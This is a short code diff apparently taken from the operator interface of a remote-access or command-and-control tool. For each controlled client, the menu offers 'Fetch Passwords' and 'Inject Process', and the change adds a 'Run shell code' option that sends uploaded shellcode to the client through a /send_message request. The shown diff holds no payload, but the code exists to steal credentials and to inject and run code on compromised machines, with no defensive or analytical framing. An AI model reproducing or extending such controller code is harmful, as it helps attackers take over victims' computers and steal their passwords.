@@ -1,5 +1,5 @@
 import { Loading } from './Loader.js';
-
+import { SendInjectShellCodeLocal } from './ShellcodeOption.js';
   
 let chatVisible = false;
 let selectedClient = null;
@@ -265,7 +265,7 @@ function InjectOption(e, id){
 }
 
 
-function SendInjectByPid(pid,icon, id){
+function SendInjectByPid(pid,icon,id){
   UploadProcessToInject().then(shellonbase => {
     return fetch("/send_message", {
       method: "POST",
@@ -298,7 +298,8 @@ function DisplaySettings(clientDiv, id) {
 
   const options = [
       { name: "Fetch Passwords", action: (e) => PasswordOption(e, id) },
-      { name: "Inject Process", action: (e) => InjectOption(e, id) }
+      { name: "Inject Process", action: (e) => InjectOption(e, id) },
+      { name: "Run shell code", action: () => SendInjectShellCodeLocal(UploadProcessToInject, id) }
   ];
 
   if (!menu) {
